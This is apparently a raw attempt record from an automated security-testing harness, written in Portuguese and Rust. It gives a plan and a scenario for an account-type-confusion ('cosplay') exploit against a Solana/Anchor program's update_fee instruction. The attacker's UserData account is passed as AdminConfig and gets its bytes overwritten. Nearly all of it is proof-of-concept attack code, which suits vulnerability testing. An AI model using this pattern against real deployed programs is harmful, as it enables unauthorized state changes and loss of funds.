attempts.raw:
{
  "plan": "Preparamos uma conta AdminConfig legítima com admin = carteira legítima e fee inicial, e uma conta UserData cujo campo authority é a pubkey do atacante. O baseline chama update_fee com a AdminConfig legítima e a autoridade legítima, provando que o cenário está correto. O ataque chama update_fee passando a conta UserData no lugar da AdminConfig, assinada pelo atacante, cuja pubkey coincide com os bytes 8..40 da UserData. O efeito mede que os bytes 40..48 da conta UserData foram sobrescritos com o novo fee, algo que o uso legítimo nunca faria naquela conta.",
  "scenario": "let admin = Pubkey::new_unique();
let attacker = Pubkey::new_unique();

let config_data = anchor_account_data("AdminConfig", &(admin, 100u64));
let config = account(&env.program_id, &config_data, None);

let user_data = anchor_account_data("UserData", &(attacker, 0u64));
let user_account = account(&env.program_id, &user_data, None);

let authority = wallet(1_000_000_000);

let metas = vec![
    AccountMeta::new(config.key(), false),
    AccountMeta::new_readonly(admin, true),
];
let ix = env.anchor_ix("update_fee", &(200u64,), metas);
let contas = vec![
    (config.key(), config.clone()),
    (admin, authority.clone()),
];
let r = env.baseline("update_fee legitimo", &ix, &contas);

let metas_attack = vec![
    AccountMeta::new(user_account.key(), false),
    AccountMeta::new_readonly(attacker, true),
];
let ix_attack = env.anchor_ix("update_fee", &(999u64,), metas_attack);
let contas_attack = vec![
    (user_account.key(), user_account.clone()),
    (attacker, wallet(1_000_000_000)),
];
let r_attack = env.attack("cosplay UserData como AdminConfig", &ix_attack, &contas_attack);

if r_attack.program_result == ProgramResult::Success {
    let data = after(&r_attack, &user_account.key()).data();
    env.effect("fee da UserData sobrescrito", read_u64(data, 40) == 999u64);
}"
}

